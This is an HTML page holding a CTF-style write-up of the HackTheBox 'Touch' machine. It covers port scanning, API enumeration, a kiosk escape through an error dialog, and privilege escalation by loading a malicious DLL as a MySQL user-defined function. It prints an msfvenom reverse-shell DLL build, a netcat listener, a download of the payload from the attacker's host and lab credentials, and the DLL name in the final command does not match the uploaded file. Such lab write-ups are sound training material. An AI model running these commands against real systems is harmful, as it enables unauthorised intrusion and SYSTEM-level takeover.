@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<meta name="theme-color" content="#030305"/>
+<title>Touch - HTB Write Up | pumkin</title>
+<meta name="description" content="HackTheBox Touch (Easy, Windows) write up: DeviceHub enumeration, kiosk escape, and MySQL DLL hijacking for SYSTEM."/>
+<link rel="icon" href="../cat.png"/>
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#030305;--border:rgba(255,255,255,.06);--text:#fafafa;--muted:#9ca3af;--dim:#6b7280;--purple:#c084fc;--blue:#60a5fa;--emerald:#34d399}
+body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,-apple-system,sans-serif;min-height:100vh;overflow-x:hidden;position:relative}
+body::before{content:'';position:fixed;inset:0;background:linear-gradient(rgba(255,255,255,.015) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.015) 1px,transparent 1px);background-size:60px 60px;z-index:0;pointer-events:none}
+.cyber-grid{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}.cyber-grid::before{content:'';position:absolute;width:100%;height:100%;background:radial-gradient(circle at 50% 0%,rgba(96,165,250,.08),transparent 50%)}
+main{position:relative;z-index:1;min-height:100vh;width:100%;padding:2rem 1rem}@media(min-width:768px){main{padding:3rem 2rem}}
+.max-w{max-width:72rem;width:100%;margin:0 auto}.nav-row{display:flex;align-items:center;gap:1rem;margin-bottom:2rem;flex-wrap:wrap}.back-btn{display:inline-flex;align-items:center;gap:.5rem;padding:.5rem 1rem;border-radius:.75rem;background:rgba(255,255,255,.03);border:1px solid var(--border);color:var(--muted);text-decoration:none;font-family:monospace;font-size:.75rem;text-transform:uppercase;letter-spacing:.1em}.icon-sm{width:14px;height:14px}
+.panel{background:#0a0b0f;border:1px solid var(--border);border-radius:1rem;overflow:hidden}.writeup-body{padding:2rem;max-width:60rem;margin:0 auto}@media(min-width:768px){.writeup-body{padding:3rem}}
+.meta{color:var(--dim);font-size:.75rem;font-family:monospace;letter-spacing:.1em;text-transform:uppercase;margin-bottom:1rem}h1{font-size:1.75rem;font-weight:800;text-transform:uppercase;margin-bottom:1.5rem}@media(min-width:768px){h1{font-size:2.5rem}}
+h2{font-size:1.25rem;color:var(--purple);margin:2.5rem 0 1rem;padding-bottom:.5rem;border-bottom:1px solid var(--border)}p,li{color:var(--muted);font-size:.95rem;line-height:1.75}p{margin-bottom:1rem}ul{margin:0 0 1rem 1.25rem}li{margin-bottom:.25rem}strong{color:var(--text)}a{color:var(--purple)}code{font-family:monospace;font-size:.85rem;background:rgba(168,85,247,.1);color:var(--purple);padding:2px 6px;border-radius:6px}pre{background:rgba(0,0,0,.5);border:1px solid var(--border);border-radius:.75rem;padding:1rem;margin:1rem 0;font:.8rem/1.6 monospace;color:var(--emerald);white-space:pre-wrap;overflow-wrap:anywhere}.info-grid{display:grid;grid-template-columns:1fr;gap:.75rem;margin:1rem 0}@media(min-width:768px){.info-grid{grid-template-columns:repeat(3,1fr)}}.info-cell{background:rgba(0,0,0,.3);border:1px solid var(--border);border-radius:.75rem;padding:1rem}.lbl{color:var(--dim);font:.65rem monospace;text-transform:uppercase;letter-spacing:.1em;margin-bottom:.25rem}.val{font-size:.9rem;font-weight:600}.tag{display:inline-block;padding:2px 10px;border-radius:9999px;font:.7rem monospace;letter-spacing:.1em;text-transform:uppercase}.tag-easy{background:rgba(52,211,153,.1);border:1px solid rgba(52,211,153,.3);color:var(--emerald)}.tag-windows{background:rgba(96,165,250,.1);border:1px solid rgba(96,165,250,.3);color:var(--blue)}.footer{text-align:center;padding-top:3rem;color:var(--dim);font:10px monospace;letter-spacing:.15em;text-transform:uppercase}
+</style>
+</head>
+<body><div class="cyber-grid"></div><main><div class="max-w">
+<div class="nav-row"><a href="../writeups.html" class="back-btn"><svg class="icon-sm" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg>Write Ups</a><a href="../index.html" class="back-btn">Home</a></div>
+<div class="panel"><div class="writeup-body">
+<p class="meta">hackthebox / easy / windows</p><h1>Touch</h1>
+<div class="info-grid"><div class="info-cell"><div class="lbl">Platform</div><div class="val">HackTheBox</div></div><div class="info-cell"><div class="lbl">Difficulty</div><div class="val"><span class="tag tag-easy">Easy</span></div></div><div class="info-cell"><div class="lbl">OS</div><div class="val"><span class="tag tag-windows">Windows</span></div></div></div>
+
+<h2>Summary</h2><p>Touch exposes a Nexion DeviceHub web interface and a Windows RDP service. A booking confirmation recovered from the previous Layover machine authenticates to the DeviceHub dashboard, which contains kiosk credentials. RDP access leads to a locked-down passport-scanning kiosk; stopping its services exposes an error workflow that can be used to open Explorer and launch a command prompt. For privilege escalation, a writable MySQL installation runs as SYSTEM, while a scheduled batch file reveals the database root password. A malicious DLL registered as a MySQL user-defined function provides a SYSTEM shell.</p>
+
+<h2>Enumeration</h2>
+<pre>PORT     STATE SERVICE       VERSION
+135/tcp  open  msrpc         Microsoft Windows RPC
+3389/tcp open  ms-wbt-server Microsoft Terminal Service
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+8443/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-cors: GET POST PUT OPTIONS
+| http-title: Nexion DeviceHub - Login
+|_Requested resource was /login
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-trane-info: Problem with XML parsing of /evox/about
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</pre>
+<p>The exposed services include RDP on port 3389 and a web application on port 8443. The web service identifies itself as Nexion DeviceHub, with a login page for the Nexion DocReader and DeviceHub DH-100 at Gate B7.</p>
+<p>A clue carried over from the Layover machine provides a name and booking confirmation code:</p>
+<pre>"In the Layover machine, you uncovered a nae and a booking confirmation code. Maybe they'll come in handy here? Jenny Crawford / KS7X2M"</pre>
+<p>The confirmation code is not immediately useful as an application password, but it establishes the connection to the previous machine and provides a candidate credential to test.</p>
+
+<h2>DeviceHub Access</h2>
+<p>Content enumeration against the API reveals two useful routes:</p>
+<pre>feroxbuster -u http://touch.htb:8443/api/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
+403      GET        1l        2w       35c http://touch.htb:8443/api
+405      GET        1l        3w       30c http://touch.htb:8443/api/scan
+200      GET        1l        3w      116c http://touch.htb:8443/api/status</pre>
+<p>The status endpoint discloses the device serial number and firmware details:</p>
+<pre>device  "Nexion DeviceHub DH-100"
+serial  "NX-DH-2024-B7042"
+firmware  "1.4.2"
+status  "online"
+uptime  74026</pre>
+<p>The <code>serial</code> value works as the password for the DeviceHub login page. After authenticating, the dashboard exposes the credentials used by the passport scanner:</p>
+<pre>Username  KioskUser
+Password  K!0sk2026#</pre>
+
+<h2>Initial Access</h2>
+<p>Use the kiosk credentials to connect through RDP:</p>
+<pre>xfreerdp /v:10.129.118.155 /u:KioskUser /p:'K!0sk2026#' /dynamic-resolution +clipboard /cert:ignore</pre>
+<p>The session opens inside a passport-scanning application. The kiosk restrictions prevent a normal escape, so the scanner workflow itself is used to reach a desktop process.</p>
+<ol><li>Stop the printer and scanner services from the dashboard.</li><li>Attempt to log in as administrator or perform another action in the kiosk.</li><li>Wait for the resulting error dialog and select its link.</li><li>When Edge opens, right-click the page and choose <strong>Save as</strong>.</li><li>The Save As dialog opens an Explorer window.</li><li>Enter <code>cmd</code> in the path field to launch a command prompt.</li></ol>
+<p>This provides access to the kiosk user and the user flag.</p>
+
+<h2>Privilege Escalation</h2>
+<p>First, inspect the current token groups:</p>
+<pre>whoami /groups
+
+KIOSK-042\Printer Administrators</pre>
+<p>Reviewing the root of <code>C:\</code> reveals <code>MySQL</code> and <code>ProgramData</code>. The MySQL installation contains many executables and DLLs, and the service runs with SYSTEM privileges. More importantly, <code>C:\MySQL\bin</code> is writable, making the installation a candidate for DLL hijacking.</p>
+<p>The <code>ProgramData</code> directory contains <code>refresh-dates.bat</code>, which discloses the MySQL root password in plaintext:</p>
+<pre>type .\refresh-dates.bat
+@echo off
+C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 &lt; "C:\ProgramData\HTB Airways\refresh-dates.sql" 2&gt;nul</pre>
+<p>Build a Windows reverse-shell DLL, transfer it to the writable MySQL plugin directory, and start a listener:</p>
+<pre>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.xxxx2 LPORT=9001 -f dll -o evil.dll
+rlwrap nc -lvnp 9001
+python3 -m http.server 80
+iwr -uri http://10xxxx2/evil.dll -outfile C:\MySQL\lib\plugin\evil.dll</pre>
+<p>Register the DLL as a MySQL user-defined function. The MySQL service loads the library with SYSTEM privileges:</p>
+<pre>C:\MySQL\bin\mysql.exe -u root "-pHTB@irw4ys_DB!2026" -e "DROP FUNCTION IF EXISTS sys_exec; CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.dll';"</pre>
+<p>Check the listener after invoking the function. The resulting shell is running as <code>NT AUTHORITY\SYSTEM</code>. Retrieve the root flag.</p>
+</div></div><p class="footer">pumkin / write ups</p>
+</div></main></body></html>
